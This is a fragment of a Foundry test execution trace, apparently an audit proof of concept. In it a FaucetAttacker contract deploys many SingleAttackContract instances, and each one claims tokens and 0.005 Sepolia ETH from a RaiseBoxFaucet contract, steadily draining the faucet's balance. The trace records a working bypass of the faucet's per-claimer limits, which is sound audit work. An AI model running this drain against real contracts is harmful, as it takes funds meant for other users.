    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 62) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7190245] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7189486] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7153318] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [7145660] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 685000000000000000 [6.85e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x663e1a737b766a01573ed55D421605621A59F05b
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 63) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6888276] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6887517] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6851349] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6843691] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 680000000000000000 [6.8e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x0915D2515718D7BE17E7F9F2ce108AE96Fa8D7bb
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 64) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6586307] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6585548] RaiseBoxFaucet::claimFaucetTokens()
